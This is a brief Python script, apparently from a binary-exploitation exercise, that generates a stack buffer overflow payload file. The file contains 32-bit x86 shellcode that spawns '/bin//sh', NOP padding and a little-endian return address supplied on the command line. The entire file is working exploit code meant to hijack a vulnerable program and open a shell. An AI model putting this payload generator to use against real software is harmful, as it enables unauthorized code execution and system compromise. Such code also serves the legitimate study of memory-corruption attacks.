import argparse
import binascii

parser = argparse.ArgumentParser()
parser.add_argument("addr", type=str)
parser.add_argument("pad", type=int)

def write_pld(addr, pad):
	fw = open('pld', 'wb')
	
	# Write shellcode
	fw.write(b'\x31\xc0')
	fw.write(b'\x50')
	fw.write(b'\x68\x6e\x2f\x73\x68')
	fw.write(b'\x68\x2f\x2f\x62\x69')
	fw.write(b'\x89\xe3')
	fw.write(b'\x99')
	fw.write(b'\x52')
	fw.write(b'\x56')
	fw.write(b'\x89\xe1')
	fw.write(b'\xb0\x0b')
	fw.write(b'\xcd\x80')

	# Write pad
	for i in range(pad):
		fw.write(b'\x90')

	# Convert and write addr
	# 0xabcdefgh -> \xgh\xef\xcd\xab
	format_str = "{gh}{ef}{cd}{ab}"
	addr_formatted = format_str.format(ab=addr[:2],
					   cd=addr[2:4],
					   ef=addr[4:6],
					   gh=addr[6:])
	print(addr_formatted)
	addr_bytes = binascii.a2b_hex(addr_formatted)
	fw.write(addr_bytes)

	fw.close()


if __name__ == '__main__':
	args = parser.parse_args()
	addr = args.addr
	while len(addr) < 8:
		addr = "0" + addr
	write_pld(addr, args.pad)

